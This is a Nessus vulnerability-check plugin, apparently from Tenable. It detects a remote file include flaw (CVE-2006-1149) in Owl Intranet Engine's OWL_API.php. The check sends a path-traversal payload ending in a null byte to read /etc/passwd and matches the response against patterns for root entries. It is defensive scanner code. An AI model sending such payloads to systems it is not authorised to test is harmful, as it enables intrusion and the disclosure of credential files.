#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that suffers from a remote
file include vulnerability. 

Description :

The remote host is running Owl Intranet Engine, a web-based document
management system written in PHP. 

The version of Owl Intranet Engine on the remote host fails to
sanitize user-supplied input to the 'xrms_file_root' parameter of the
'lib/OWL_API.php' script before using it in a PHP 'require_once'
function.  An unauthenticated attacker may be able to exploit this
issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://downloads.securityfocus.com/vulnerabilities/exploits/owl_082_xpl.pl

Solution :

Unknown at this time. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21025);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1149");
  script_bugtraq_id(17021);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"23734");
  }

  script_name(english:"Owl Intranet Engine xrms_file_root Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read /etc/passwd via Owl");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/owl", "/intranet", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  file = "../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/lib/OWL_API.php?",
      "xrms_file_root=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(string:res, pattern:"main\(.+/etc/passwd\\0/include-locations\.inc.+ failed to open stream") ||
    egrep(string:res, pattern:"Failed opening required '.+/etc/passwd\\0include-locations\.inc'")
  ) {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<br />");

    if (isnull(contents)) report = desc;
    else {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_warning(port:port, data:report);
    exit(0);
  }
}
